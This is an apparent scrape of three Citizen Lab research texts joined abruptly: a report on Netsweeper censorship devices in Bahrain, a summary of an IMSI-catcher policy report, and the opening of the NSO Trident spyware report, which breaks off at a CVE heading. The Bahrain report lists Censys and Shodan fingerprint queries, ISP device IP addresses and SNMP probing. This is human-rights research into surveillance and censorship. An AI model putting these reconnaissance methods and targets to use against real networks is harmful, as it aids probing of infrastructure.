Hacking Team commissioned to investigate the sale of surveillance tools to Bahrain noted the ongoing human rights concerns in the country.  \nBahrain has jailed dozens of netizens for expressing critical opinions online, including those using pseudonymous accounts.  In some cases, those arrested appear to have been identified using “IP Spy” links sent by the government.  When a target clicks on such a link, their IP address is logged and sent to the government, who then sends a request to the user’s ISP to get the associated subscriber’s name and address.\nFacebook was widely used to organize during the 2011 uprising; however, reports have suggested that Facebook groups were also used to monitor and identify protesters — in one case reportedly leading to the arrest and torture of prominent anti-government protester Ayat Al Qurmezi.\nPart 2: Netsweeper in Bahrain\nIn January 2016, the Bahraini government’s online tender website displayed a Telecommunications Regulatory Authority tender for a ‘National Website Filtering Solution,’ which appeared to have been won by Netsweeper for either $1.1M USD or $3.1M USD.  Netsweeper appears to have been the only bidder, as the document says the number of bids submitted was only one. The tender type was listed as “selected,” indicating that the government invited a small number of companies to bid on the tender.  Netsweeper did not respond to media inquiries about this tender.\nWith the release of the TRA tender appearing to indicate Netsweeper, Inc. had been chosen to deploy a ‘National website filtering solution’, we set out to investigate the presence of Netsweeper technology on networks in Bahrain.\nThis research set out to answer three basic questions:\n\nAre Netsweeper installations present on the networks of Bahrain-based ISPs?\nIf so, are these installations used to filter content? In particular, are they used to filter critical political content or speech otherwise protected by international human rights law?\nIf Netsweeper installations are present in Bahrain, are they communicating with Netsweeper, Inc.-controlled infrastructure? For example, are they receiving updates to categorization databases?\n\nAnswering each of these questions required a range of methods, including:\n\nNetwork scanning data to determine the presence of devices that match Netsweeper fingerprints;\nIn-country and proxy testing to identify filtering behaviour at the ISP level; and\nThe use of a ‘beacon box’ or ‘phone home’ test to determine if Netsweeper installations in Bahrain are communicating with Netsweeper, Inc.-controlled infrastructure.\n\nIn the following section, we will describe the results of our research to answer these three questions.\nTechnical analysis\nIn this section we will explore and try to resolve the three questions posed about the presence and function of Netsweeper installations in Bahrain. \n1. Are there Netsweeper devices in Bahrain?\nTo identify the presence of Netsweeper technology on Bahrain-based ISPs, we queried two services that aggregate Internet-wide scanning data: Censys and Shodan. We used Censys to look for visible HTTP interfaces of Netsweeper products, and we used Shodan to find SNMP1 interfaces.  We used a range of different queries to find different instances of Netsweeper installations. The queries were based on both prior research and trial and error experimentation. The full list of queries used for finding these installations are outlined below:\n\n.tg  {border-collapse:collapse;border-spacing:0;}<br />.tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;}<br />.tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;}<br />.tg .tg-ox40{font-weight:bold;font-size:12px;vertical-align:top}<br />.tg .tg-dx8v{font-size:12px;vertical-align:top}<br />\n\n\n\nProvider\nQuery\nDetails\n\n\ncensys\n80.http.get.title: “Netsweeper Business”\nHTTP interface of Business branded Netsweeper installations.\n\n\ncensys\n80.http.get.title: “Netsweeper SMB”\nHTTP interface of Business branded Netsweeper installations.\n\n\ncensys\n80.http.get.title: “Netsweeper School”\nHTTP interface of Education branded Netsweeper installations.\n\n\ncensys\n80.http.get.title: “Netsweeper Cloud Manager”\nHTTP interface of generic branded Netsweeper installations.\n\n\ncensys\n\\/webadmin\\/common\\/templates\\/\nA common code element in Netsweeper HTTP interfaces.\n\n\ncensys\n\\/webadmin\\/deny\\/index.php\nDefault url path for Netsweeper block pages\n\n\nshodan\n.el5.netsw\nCommon SNMP sysDescr value for Netsweeper installations.\n\n\nshodan\n.el6.netsw\nCommon SNMP sysDescr value for Netsweeper installations.\n\n\n\nTable 1 – Queries used in preliminary identification of Netsweeper devices.\nWe restricted our queries to IP addresses geo-located in Bahrain.2\nWe then visited the IP addresses directly and captured the results to verify they were running the Netsweeper web administrator interface as seen in Figure 1.\nFigure 1 – A sample Netsweeper web administrator interface.\nAccessing the path of “webadmin/deny/index.php” on the visited IPs will show the configured deny page as shown in Figure 2.\nFigure 2 – Netsweeper Default Blockpage\nTable 2 lists every IP address where we found Netsweeper web interfaces to which we were able to connect. In one instance, we identified an IP address (188.137.140.21) using Shodan with the hostname “netsweeper-02.i.infonas.com”, on the network of Infonas (formerly 2Connect)3 but as we were unable to connect to the web interface it has been excluded from the table.\n\n\n\nIP Address\nAS Name\n\n\n62.209.25.186\nMTC Vodafone Bahrain (B.S.C.)\n\n\n109.161.148.250\nMTC Vodafone Bahrain (B.S.C.)\n\n\n80.241.146.26\nNorthstar Technology Company W.L.L.\n\n\n80.95.222.114\nEtisalcom Bahrain Company W.L.L.\n\n\n80.95.222.115\nEtisalcom Bahrain Company W.L.L.\n\n\n84.235.107.71\nVIVA Bahrain BSC Closed\n\n\n84.235.107.72\nVIVA Bahrain BSC Closed\n\n\n84.235.107.203\nVIVA Bahrain BSC Closed\n\n\n84.235.107.206\nVIVA Bahrain BSC Closed\n\n\n87.236.136.186\nNuetel Communications S.P.C\n\n\n87.236.136.187\nNuetel Communications S.P.C\n\n\n87.236.52.38\nKalaam Telecom Bahrain B.S.C.\n\n\n185.34.229.236\nRapid Telecommunications W.L.L.\n\n\n185.34.229.237\nRapid Telecommunications W.L.L.\n\n\n193.188.97.224\nBatelco\n\n\n\nSince Netsweeper devices were spread across ISPs in Bahrain we examined the associated block pages to see if there was any overlap in regards to which networks they are on. The blockpage of www.anonymous.com.bh was reported as early as 2009 in Bahrain. \nFigure 3: The Bahraini blockpage hosted on www.anonymous.com.bh\nUsing the text on that block page we made a query to see what other sites in Bahrain have similar text.  This search lead us to three additional IP addresses with block pages that contained similar text and design elements to the anonymous.com.bh blockpage. \n\n\n\nIP Address\nAS Name\nHostname (if any)\n\n\n83.136.59.52\nMTC Vodafone Bahrain (B.S.C.)\n\n\n\n83.136.58.185\nMTC Vodafone Bahrain (B.S.C.)\nblock.bb.zain.com\n\n\n193.188.112.86\nBatelco\nwww.anonymous.com.bh\n\n\n188.137.140.22\nInfonas WLL\n\n\n\n\nTable 3: Blockpages in Bahrain and their associated AS Name.\nClustering the Netsweeper IP addresses along with the blockpage reveals overlap as shown in Figure 4.  MTC-Vodafone has two Netsweeper servers as well as two blockpages. Batelco and Infonas each have a single Netsweeper server and a single block page on their network.  The rest of the ISPs only have Netsweeper servers, ranging from one to four per ISP.\nFigure 4: Blockpage and Netsweeper Web interface IPs clustered by ISP\nWe also attempted to retrieve the SNMP ‘sysName’ value of any Netsweeper IP addresses which have the SNMP port open and the service running.   We looked at the sysName value because it is commonly used to relay the hostname of a device, and the hostname may indicate the function of the device in the context of the larger installation.  We retrieved this value using snmpwalk requesting the standard OID for sysName.  The SNMP information retrieved is presented in Table 4.\n \n\n\n\nIP Address\nAS Name\nSNMP SysName\n\n\n62.209.25.186\nMTC Vodafone Bahrain (B.S.C.)\nzain-tmp-ps01\n\n\n109.161.148.250\nMTC Vodafone Bahrain (B.S.C.)\nzain-tmp-ps02\n\n\n80.95.222.114\nEtisalcom Bahrain Company W.L.L.\netisalcom_ps01\n\n\n80.95.222.115\nEtisalcom Bahrain Company W.L.L.\netisalcom_ps02\n\n\n84.235.107.203\nVIVA Bahrain BSC Closed\nviva-tubli-ps01\n\n\n84.235.107.206\nVIVA Bahrain BSC Closed\nlocalhost.localdomain\n\n\n84.235.107.71\nVIVA Bahrain BSC Closed\nviva-hora-ps01\n\n\n84.235.107.72\nVIVA Bahrain BSC Closed\nviva-hora-ps01\n\n\n87.236.136.186\nNuetel Communications S.P.C\nlocalhost.localdomain\n\n\n87.236.136.187\nNuetel Communications S.P.C\nlocalhost.localdomain\n\n\n185.34.229.236\nRapid Telecommunications W.L.L.\nrapid-ps01\n\n\n185.34.229.237\nRapid Telecommunications W.L.L.\nrapid-ps02\n\n\n80.241.146.26\nNorthstar Technology Company W.L.L.\nNorthstar-PS01\n\n\n87.236.52.38\nKalaam Telecom Bahrain B.S.C.\nkalaam-temp-ps01\n\n\n\nTable 4: SNMP SysName values for Netsweeper servers in Bahraini ISPs.\nIn most cases, the SNMP sysName is the name of the ISP followed by ‘PS’ and a number.  ‘PS’ likely refers to the Netsweeper policy server, which is the name of the component of a Netsweeper installation that performs the blocking logic.  Both Zain and Kalaam Telecom’s sysNames refer to their installations with the word temp, implying that these may be temporary installations.\nHTTPS certificate dates\nWe also examined the HTTPS certificates present on the web interfaces of the Netsweeper login pages.  These are relevant because they can help estimate the date and time the local Netsweeper server was configured on the network of the ISP. It is not standard practice for HTTPS certificates to come pre-installed by the developer (as this would provide Netsweeper, Inc. with the ISP’s private key) so it is likely that the certificates have been generated upon initial configuration at the ISP. We investigated the validity values on the certificates and focus here on the “Issued on” value, which suggests the date the server was configured.  We adjust the timezone to Arabia Standard Time (AST) and present these values on a timeline in Figure 5. \nFigure 5: Timeline of Netsweeper Certificate creation on Bahraini ISPs\nWe see the earliest certificate being generated May 18, 2016 at Rapid Telecom and the last at Batelco on July 4, 2016.  The totality of certificates is generated in this three month span.  Most of the certificates were generated during daytime hours (AST), and grouped according to ISP.  For example, we see Nuetel configure the whole infrastructure we identify on May 23, 2016 within three hours.  Conversely, the installation at VIVA is the most spread out on the timeline ranging from May 19 to June 27. In total, this evidence suggests that Netsweeper installations appeared on a series of Bahraini ISPs four months after the TRA tender announcing Netsweeper’s bid on the filtering system. \n2. Are Netsweeper devices filtering content in Bahrain?\nNetsweeper blocking fingerprint\nAlthough our network scanning data confirms the presence of Netsweeper installations on the networks of Bahraini ISPs, it alone does not tell us whether the installations are actively being used to filter content for customers of these ISPs. In order to test whether the installations were used to filter content, we attempted to access censored content on the ISP Batelco and examined the responses. \nWe accessed the website of the Arab Times (arabtimes.com), which has been identified as being blocked, using a public proxy on the Batelco network. When we accessed this page we received the following response:\n\nThe response contains an iframe to www.anonymous.com.bh, the blockpage we have identified as being in use since 2009 in Bahrain.  An interesting addition in this response is the parameters after the “/” sent to this block page URL.  We URL decode and add newlines to the parameters to increase legibility of this here:\n\n\n?dpid=9\r\n&dpruleid=1\r\n&cat=105\r\n&dplanguage=-\r\n&url=http://arabtimes.com/\r\n\n\nThese values: dpid, dpruleid, cat and dplanguage are identical parameters used by Netsweeper installations we have seen in Pakistan, Somalia, and Yemen.  The cat parameter denotes the categorization of the blocked URL. The current mapping of category number to readable name is available here. Category number 105 refers to the “Custom” category, or a URL that was manually entered by the ISP administrators.  \nThe packet capture collected from this Batelco vantage point also showed that our computer received two different responses: one with the blockpage in an iframe as seen above, and a response containing the legitimate Arab Times front page shortly thereafter.  This behavior is consistent with packet injection from a device located between the user and website.  If a requester receives the blockpage response first, it will render the blockpage and discard the second, legitimate, response.  The injected blockpage response has a Time-To-Live (TTL) value of 61.  Assuming that the initial TTL is set to 64 (a common value for initial TTLs), this indicates that the device performing the injection is close to the user.  As a result, the injecting server will almost always win the race versus the legitimate response, guaranteeing that most web browsers will only show the block page response. This process renders the legitimate content inaccessible.\nIn addition, all injected responses also have an identical IPID value of 242.  An IPID is a value set in the IP header of a packet that is used primarily for reassembly and fragmentation of data exchanges.  This value can be set differently by the operating system that sent the packet; some will set it to zero, others will set it to the same number, and others might just increment the value with each packet sent.  This IPID value is particularly relevant here, as our research showed that Netsweeper devices in Yemen also used an IPID value of 242.\nContent types found blocked\nTo confirm that Netsweeper products were being used to censor content on Bahrain-based ISPs, as well as to identify the types of content that were being blocked, we conducted manual testing from a vantage point on the ISP Batelco.\nThese limited tests consisted of connecting to a proxy on the Batelco network, and attempting to access a list of sensitive Bahrain-specific and regional content in a web browser. All URLs that generated a blockpage were identified as blocked. (The absence of a given URL from the list of blocked URLs does not definitively indicate that the URL is accessible on Batelco) A full list of URLs tested and those found blocked can be found in the Data section at the end of this report. In-country testing was limited out of concern for tester security. Further research is required to identify filtering behaviour on additional ISPs in Bahrain. \nThe types of content found blocked via this method of testing include:\n\n    .tg  {border-collapse:collapse;border-spacing:0;}<br />    .tg .tg-9hbo{font-weight:bold;vertical-align:top}<br />    .tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;}<br />    .tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;}<br />    .tg .tg-yw4l{vertical-align:top}<br />\n\n\n\nContent type\nExamples\n\n\nWebsites affiliated with local political groups including the opposition movements al-Wefaq, Bahrain Freedom Movement and February 14\nhttp://alwefaq.net\nhttp://www.vob.org\nhttp://www.14febrayer.com\n\n\nWebsites of local human rights and advocacy organizations\nhttp://www.bahrainrights.org\n\n\nBahraini publications that post content critical of the government of Bahrain\nhttp://bahrainmirror.com\nhttp://bahrainalyoum.net\nhttp://lualuatv.com\nhttp://alduraz.net\n\n\nWebsites on the Shia sect\nhttp://shiaweb.org\nhttp://albrhan.org\nhttp://www.ansarh.com\n\n\nWebsites which have content critical of Islam\nhttp://answering-islam.org\nhttp://www.faithfreedom.org\n\n\nAtheism content in Arabic\nhttp://arabel7ad.blogspot.com\nhttp://www.ladeeni.net\n\n\nIranian media outlets\nhttp://www.alalam.ir\n\n\nMedia affiliated with Lebanon’s Hezbollah\nhttp://www.almanar.com.lb\n\n\nRegional Arabic news websites\nhttp://www.alquds.co.uk\n\n\nRegional human rights and free speech advocates\nhttp://www.anhri.net\n\n\nGambling websites\nhttp://www.cdl.com.lb\nhttp://www.williamhill.com\n\n\nAnonymization and circumvention tools\nhttp://www.xroxy.com\nhttp://www.samair.ru\nhttp://www.proxyfire.net\nhttp://anonym.to\n\n\nArab Christian websites\nhttp://www.arabchurch.com\n\n\nArabic secular discourse\nhttp://www.rezgar.com\n\n\nAll content categorized by Netsweeper as ‘Pornography’, ‘Gambling’, ‘Viruses’, or ‘Web Proxy’\nSee ‘Deny Page Tests’ section below:\nhttp://denypagetests.netsweeper.com/category/catno/10\nhttp://denypagetests.netsweeper.com/category/catno/21\nhttp://denypagetests.netsweeper.com/category/catno/23\nhttp://denypagetests.netsweeper.com/category/catno/32\n\n\n\nTable 5: Examples of URLs found blocked on Batelco\n‘Deny page tests’\nAmongst the websites tested for accessibility were a special set of URLs referred to as ‘deny page test’ URLs. These are URLs created by Netsweeper, Inc. specifically for the purpose of testing which content categories are blocked by a Netsweeper installation. A custom URL is created for each category (e.g. “pornography”, “sex education”) and that URL — while not containing any of that type of content — is categorized by Netsweeper as belonging to that category. As described by Netsweeper, Inc.:\n“For example, http://denypagetests.netsweeper.com/category/catno/23, is categorized as the Pornography. When checking the Pornography category, this test will make a request to the URI of http://denypagetests.netsweeper.com/category/catno/23. If this is blocked or redirected to another page, we consider the Pornography category blocked.”\nWe tested 67 of the deny page test URLs from a Batelco proxy, and found the following four to be blocked:\n\n\n\nURL\nAssociated Netsweeper Category\n\n\nhttp://denypagetests.netsweeper.com/category/catno/10\nGambling\n\n\nhttp://denypagetests.netsweeper.com/category/catno/21\nViruses\n\n\nhttp://denypagetests.netsweeper.com/category/catno/23\nPornography\n\n\nhttp://denypagetests.netsweeper.com/category/catno/32\nWeb Proxy\n\n\n\nTable 6: ‘Deny page test’ URLs found blocked on Batelco\nThe blocking of these URLs is a strong indication that Netsweeper technology is being used to filter content on Batelco; we do not know of any reason these URLs would be blocked otherwise. Further, the ‘deny page test’ content categories found to be blocked are consistent with some of the types of content found blocked via proxy testing on Batelco.\nIt should also be noted that blocking content with a Netsweeper installation is not limited to the use of predefined content categories. System administrators are able to create ‘custom’ lists of content, including the use of wildcards, in order to block lists of content outside of the Netsweeper, Inc.-created lists. This feature is why we see content (such as human rights and news websites) blocked which do not belong to the four categories identified as blocked through the ‘deny page tests’ URLs.\n3. Are Netsweeper devices in Bahrain communicating with Netsweeper, Inc.-controlled infrastructure?\nOnce we identified the presence of Netsweeper installations on Bahrain-based ISPs, we set out to determine if the Bahrain-based installations were communicating with any infrastructure controlled by Netsweeper, Inc. We conducted a test that used the structure of Netsweeper’s categorization system to determine if such communications were taking place. \nBeacon box test\nNetsweeper’s Internet filtering solution blocks content through the interaction of two systems, broadly defined: a database of website categorizations; and software that intercepts requests for websites and determines if they are to be denied or permitted. The decision on whether to deny or permit access to a given website is made by looking up the categorization of a website in the database, and then determining if that category of content has been configured to be denied or permitted, a configuration made by the Netsweeper customer.\nNetsweeper, Inc., maintains the ‘master database’ of website categorizations that it hosts on its own infrastructure. A Netsweeper, Inc. customer (such as a Bahraini ISP) hosts a local copy of that database on its own networks. If a user of an ISP using Netsweeper products attempts to access a website, the Netsweeper software will look up the categorization of that website in the ‘local’ copy of the category database. Once it has determined the categorization of the website, it will either permit or deny access to that website depending on the policies configured by the ISP (or other Netsweeper customer).\nHowever, should an individual ISP user attempt to access an uncategorized website (for example, a newly registered domain) the local Netsweeper installation will contact the Netsweeper, Inc.-controlled master category database. (In the meantime, the local Netsweeper installation will generally permit the customer to visit the website while the categorization is taking place.) This master database will run a categorization service which will access the website, perform an automated categorization of the uncategorized website’s content, add this category to the master database and then send this categorization to the ‘local’ Netsweeper installation. Netsweeper, Inc. documentation suggests that this entire process can be completed in “as little as one second and at most about a minute”. \nSince we know that an attempt to access a previously uncategorized website should lead to the master category server accessing the website soon thereafter, we conducted a test to determine if a Bahrain-based Netsweeper installation is in fact communicating with Netsweeper, Inc.-controlled infrastructure. We registered a new domain and created a website with innocuous content. Since we control the servers on which this new website is hosted, we have access to the server logs and can determine who attempted to visit the website and where those requests originated from. As a result, after accessing these newly created websites from ISPs in Bahrain, we anticipated seeing a visit from the Netsweeper Master Category Server in our logs as this server attempts to dynamically categorize our website.\nWe have illustrated this process in Figure 6:\nFigure 6 – Block diagram explaining beacon box testing methodology.\nThis test is a duplication of a similar test we performed to confirm communications between a Netsweeper installation in Yemen and Netsweeper, Inc.-controlled infrastructure. In that case, we registered six new domains and accessed three of them from YemenNet (a Netsweeper, Inc. customer) while the other three acted as a control. In all cases, the websites contained innocuous content. We found that in all three instances of the websites being accessed from YemenNet, our web servers were visited by similar IP addresses with requests containing the same user-agent string and requesting headers within one second of our accessing the website from YemenNet. This activity precisely matched a previous instance described by customers of the Australian ISP Telstra, which was later confirmed by Telstra to be Netsweeper servers performing a categorization of previously unseen websites. \nWe performed this test on three ISPs in Bahrain: Batelco, Zain and VIVA. We registered eight new domains: two for each of these ISPs and two to act as a control. We hosted the same identical, innocuous text content on each site, and did not access the sites beyond confirming the sites were reachable from the University of Toronto’s network. The results were as follows:\nBatelco\nOur server logs show both websites being requested from Bahrain. There was no evidence of any further relevant requests for either of the two websites.\nVIVA\nFor both websites, our server logs show the original request for the website from Bahrain, which are followed roughly one second later by a request from IP addresses hosted by Digital Ocean, a large network service provider. Although each website was visited by a different Digital Ocean IP address, both requests included identical HTTP headers and user-agent strings.  The user agent in this request matched the user agent seen in the Yemen experiment.\nZain\nMuch like the results for VIVA, our server logs show the requests for both websites from Bahrain are followed within approximately one to two seconds by a request from an IP address hosted by Digital Ocean. Again, both of the Digital Ocean IP addresses are different, however the HTTP headers and user-agent strings were identical, and the same as those seen on VIVA.  This user agent again matched the user agent seen in the Yemen experiment.\nControl\nWe did not notice any unusual visits to either of these websites, and did not identify any visits from the Digital Ocean hosted IP addresses identified in the experiment. \nBeacon box test summary\nThe results of the tests run on VIVA and Zain are generally consistent with similar tests we ran on YemenNet, a known customer of Netsweeper. Although in that case the visits were from Rackspace-hosted IP addresses, the user-agent strings and timing of categorization visits were identical. In addition, Rackspace and Digital Ocean are companies which offer similar services, and thus it is plausible that Netsweeper, Inc. has switched providers for their categorization infrastructure. As mentioned previously, the results seen on VIVA and Zain (as well as YemenNet) are consistent with similar reports from Australian ISP Telstra which were confirmed to result from Netsweeper’s categorization process.\nIt is not clear why there was no evidence of the categorization service visiting the websites tested on Batelco. As network scan data and proxy testing conducted on Batelco both indicate that a Netsweeper installation is present and active, we expected our beacon box test results to show the categorization service visiting our web server. System administrators are able to configure Netsweeper installations to prevent the dynamic categorization of previously uncategorized websites, although it is not clear why a Batelco administrator would do this. We will continue tests from Batelco, where and when they are possible, to try and shed further light on this anomaly.\nSummary of evidence pointing to the use of Netsweeper in Bahrain\nIn summary, our results indicate that Netsweeper devices are present on the networks of nine ISPs in Bahrain, that at least one of these installations is actively being used to filter content for Bahraini Internet users, and that critical political content is among the content types being filtered. The findings that support this argument are:\n\nNetwork scan data matches HTTP and SNMP fingerprints of Netsweeper installations.\nBlockpage URL parameters match those of known Netsweeper installations.\nThe IPID value of injected packets matches known Netsweeper behaviour.\nHTTPS certificate ‘Issued on’ dates show installations appear across many ISPs within a short period of time, four months after Netsweeper appears to have won the TRA bid.\nThe “beacon box tests” showed that two out of three ISPs tested exhibited behaviour consistent with previous instances of Netsweeper Inc.-controlled infrastructure categorizing a previously uncategorized website.\nAttempts to access the ‘deny page test’ URLs meant for testing a Netsweeper installation showed the URLs for content categories Gambling, Viruses, Pornography, and Web Proxy to be blocked on the ISP Batelco.\n\nA unified technical system for blocking?\nOne unanswered question is why the TRA sought out a new filtering system.  An August 2016 news article suggests that centralization may have been the motivation for purchasing a new filtering system. On August 5, 2016, the head of the TRA announced a new set of regulations stating that “all telecommunication companies in Bahrain must purchase and use a unified technical system for blocking websites”. This announcement would be consistent with the appearance of new Netsweeper installations on numerous ISPs across the country within a relatively short time span.\nFurther, Netsweeper’s filtering system does possess features that allow for the centralized sharing of configuration settings, called up2date.  This feature allows local Netsweeper servers configured at the ISPs to pull categorizations, block lists, and deny pages from a central server. If enabled, this feature would allow a central authority such as TRA to curate the block lists, which would then be pushed out to all ISPs in the deployment.\nThe centralization of content filtering was a recommendation of a March 2014 study published jointly by Bahrain’s Telecommunications Regulatory Authority and Detecon, a subsidiary of T-Systems International, itself a subsidiary of Deutsche Telekom. The study recommended the creation of “a (centralized) database of blacklisted content providers — covering all categories of unsuitable/illegal content, copyright/IPR flouting, and malware distributors — for daily distribution to ISPs”. The study also notes the use of Netsweeper in Qatar, the UAE, Pakistan and Yemen, and calls for testing the feasibility of centralized content filtering within the GCC countries. Notably, the study also flags the human rights considerations of working with certain “key vendors of content filtering and blocking solutions”, stating that “[u]sing these companies’ products can have a negative impact on a country’s political and social image”. \nThe deployment of centralized Internet filtering in Bahrain is certainly consistent with the recommendations of the March 2014 report. It remains to be seen whether the recommendation of implementing centralized content filtering across all the GCC countries materializes.\nDiscussion\nThe sale of Internet censorship technology to a government with a long track record of human rights violations, including repression of freedoms of expression and association, is troubling. While online censorship in Bahrain pre-dated Netsweeper’s successful bid, this timing only serves to demonstrate that the company sold its product to a country known to censor political speech and other legitimate expression. We confirm that Netsweeper technology is being used by at least one key ISP, Batelco, to filter content including critical political speech, news websites, human rights content, websites of oppositional political groups, and Shia-related content. Netsweeper’s filtering technology is enabling the Kingdom of Bahrain to further erode its already problematic human rights record.\nIt is notable that the export of a Canadian-produced technology that restricts the free flow of information comes as the Canadian government tries to advance cooperation with the GCC in a number of fields, including human rights. We are unaware of whether Netsweeper’s engagement with the TRA was facilitated through any trade agreements or other initiatives of the Canadian government itself.  However, the presence of Canadian-made Internet filtering technology in Bahrain being used to filter political and other legitimate content in the ways we document above raises questions about Canada’s approach to balancing business opportunities with human rights in the region.  It also once again underlines serious corporate social responsibility concerns regarding Netsweeper, Inc.  Netsweeper Inc, not only appears to have no public-facing corporate social responsibility policies; it published, and then removed, a document that specifies how its services can be tailored specifically to filter speech protected by international human rights laws.  Our latest research suggests Netsweeper continues to court contracts for national-level filtering services that clearly infringe international human rights norms and laws, even at the risk of becoming a corporate pariah.\nAcknowledgements\nThe authors would like to thank Daniel Valls for research assistance. \nData\nSupplementary technical data for this report can be found on our github located here. \n\n1 SNMP is a protocol used by system administrators to retrieve information and metrics about a device in real time for the purpose of remote monitoring device health.

    "text": "\n\t\t\t\tAuthors: Christopher Parsons, Tamir Israel\nThe Citizen Lab and CIPPIC are releasing a report, Gone Opaque? An Analysis of Hypothetical IMSI Catcher Overuse in Canada, which examines the use of devices that are commonly referred to as ‘cell site simulators’, ‘IMSI Catchers’, ‘Digital Analyzers’, or ‘Mobile Device Identifiers’, and under brand names such as ‘Stingray’, DRTBOX, and ‘Hailstorm’. IMSI Catchers are a class of of surveillance devices used by Canadian state agencies. They enable state agencies to intercept communications from mobile devices and are principally used to identify otherwise anonymous individuals associated with a mobile device and track them. \nThough these devices are not new, the ubiquity of contemporary mobile devices, coupled with the decreasing costs of IMSI Catchers themselves, has led to an increase in the frequency and scope of these devices’ use. Their intrusive nature, as combined with surreptitious and uncontrolled uses, pose an insidious threat to privacy. \nThis report investigates the surveillance capabilities of IMSI Catchers, efforts by states to prevent information relating to IMSI Catchers from entering the public record, and the legal and policy frameworks that govern the use of these devices. The report principally focuses on Canadian agencies but, to do so, draws comparative examples from other jurisdictions. The report concludes with a series of recommended transparency and control mechanisms that are designed to properly contain the use of the devices and temper their more intrusive features.\nThe report is structured across four sections:\n\nSection One provides an overview of the technical capabilities of IMSI Catchers.\nSection Two focuses on civil society and journalists’ efforts to render transparent how IMSI Catchers are used.\nSection Three examines the regulation of IMSI Catchers and avenues towards lawful regulation of their use.\nSection Four sets out best practices that should be incorporated into a framework governing IMSI Catcher use.\n\nIn more detail, Section One provides an overview of the technical capabilities of IMSI Catchers. The report principally focuses on how the devices can be used in ‘identification mode’, where they intercept digital numbers that are unique to mobile devices. IMSI Catchers exploit weaknesses in the design of mobile communications systems to induce mobile devices to transmit these unique numbers that, typically, are only sent to telecommunications carriers. From a privacy perspective, the report argues that IMSI Catchers are inherently intrusive: by design, they capture mobile identifiers from all phones in range, leading to significant collateral privacy impact that can affect the privacy of thousands of non-targets for each individual legitimate target.\nSection Two focuses on transparency efforts associated with IMSI Catchers, and how states have routinely sought to prevent information about IMSI Catchers from reaching the public record. After highlighting some of the hard-fought successes to bring documents to the public record in the United States, in particular, the report examines comparable efforts to uncover IMSI Catchers’ use in Canada and these efforts’ comparative successes and failures. In doing so, a case analysis is conducted where the Toronto Police Services Board successfully (and inappropriately) prevented documents from becoming public. The report critiques a number of the justifications that are frequently advanced by state agencies seeking to prevent information related to IMSI Catchers from becoming public. Furthermore, it argues that providing some details on IMSI Catcher use will not undermine the investigative utility of the devices, and that there is substantial public interest that should compel authorities to disclose documents regardless of whether they affect investigative utility. Furthermore, disclosure of such documents is needed to evaluate whether the possession of the devices is inconsistent with the Radiocommunications Act, the Privacy Act, and perhaps the Charter. Equally seriously, refusing to officially acknowledge IMSI Catcher use in the face of a growing body of documents demonstrating their use threatens to undermine public confidence that the devices are being used lawfully and in a manner that is proportionate and minimized their impact on non-targeted members of the public.\nSection Three examines the regulation of IMSI Catchers and avenues towards the lawful authorization of their use. After surveying German and American regulatory processes to understand gaps in the Canadian context, the report explores Canada’s ambitious statutory framework for electronic surveillance. Doing so explicates the legal avenues state agencies can exercise to authorize their use of IMSI Catchers. This section reveals how a range of overlapping powers might apply to IMSI Catcher authorization, and that this ambiguity might let agencies deploy IMSI Catchers using powers offering minimal privacy protection. The section concludes by examining the Charter implications of IMSI Catcher uses, and rejects possible justifications of IMSI Catcher deployment which lack prior judicial authorization. A series of safeguards and conditions on the use of IMSI Catchers, such that their operation does not amount to a constitutionally impermissible search, wraps up this section.\nSection Four sets out best practices that should be incorporated into a framework governing IMSI Catcher use. The section recommends that IMSI Catcher use by state agencies be subject to comprehensive transparency mechanisms, including annual statistical reporting on use, an individual notice requirement, and compliance with standard reporting obligations typically applied to radio devices owned by state agencies. It further argues for the criminalization of unauthorized uses of IMSI Catchers. Such authorization should be subject to a strict regime that is linked with demonstrating their investigative necessity, including a “serious crimes” provision that limits IMSI Catchers’ use to investigate only the most severe offences. In addition to proportionality measures, targeting and minimization procedures should be imposed to limit the collateral impact of deployment on innocent third-parties. \nThe report’s Conclusion highlights core findings and also emphasizes the importance of privacy in liberal democratic societies. \nWe hope that this report will contribute to the growing discussion and debate concerning how, and the appropriateness of, state agencies’ use of IMSI Catchers. Ultimately, it is in the government’s and citizens’ best interest for state agencies to be more transparent and accountable for how they use IMSI Catchers in the course of conducting investigations.\nDOWNLOAD FULL REPORT (English) // DOWNLOAD EXECUTIVE SUMMARY (French)\nProject Support\nThe authors would like to graciously thank a number of sources whose generous funding made this report possible: the Open Society Foundation, Frederick Ghahramani, a Social Sciences and Humanities Research Council (SSHRC) Postdoctoral Fellowship Award, and the Munk School of Global Affairs at the University of Toronto.

The Trident vulnerabilities used by NSO could have been weaponized against users of non iOS devices, including OSX.We encourage all Apple users to install the update as soon as possible. Citizen Lab is not releasing samples of the attack at this time to protect the integrity of still-ongoing investigations.\nThis report describes how a government targeted an internationally recognized human rights defender, Ahmed Mansoor, with the Trident, a chain of zero-day exploits designed to infect his iPhone with sophisticated commercial spyware.\n \n1. Executive Summary\nAhmed Mansoor is an internationally recognized human rights defender, based in the United Arab Emirates (UAE), and recipient of the Martin Ennals Award (sometimes referred to as a “Nobel Prize for human rights”).  On August 10 and 11, 2016, Mansoor received SMS text messages on his iPhone promising “new secrets” about detainees tortured in UAE jails if he clicked on an included link. Instead of clicking, Mansoor sent the messages to Citizen Lab researchers.  We recognized the links as belonging to an exploit infrastructure connected to NSO Group, an Israel-based “cyber war” company that sells Pegasus, a government-exclusive “lawful intercept” spyware product.  NSO Group is reportedly owned by an American venture capital firm, Francisco Partners Management.\nThe ensuing investigation, a collaboration between researchers from Citizen Lab and from Lookout Security, determined that the links led to a chain of zero-day exploits (“zero-days”) that would have remotely jailbroken Mansoor’s stock iPhone 6 and installed sophisticated spyware.  We are calling this exploit chain Trident.  Once infected, Mansoor’s phone would have become a digital spy in his pocket, capable of employing his iPhone’s camera and microphone to snoop on activity in the vicinity of the device, recording his WhatsApp and Viber calls, logging messages sent in mobile chat apps, and tracking his movements.  \nWe are not aware of any previous instance of an iPhone remote jailbreak used in the wild as part of a targeted attack campaign, making this a rare find.\n\nThe Trident Exploit Chain:\n\nCVE-2016-4657: 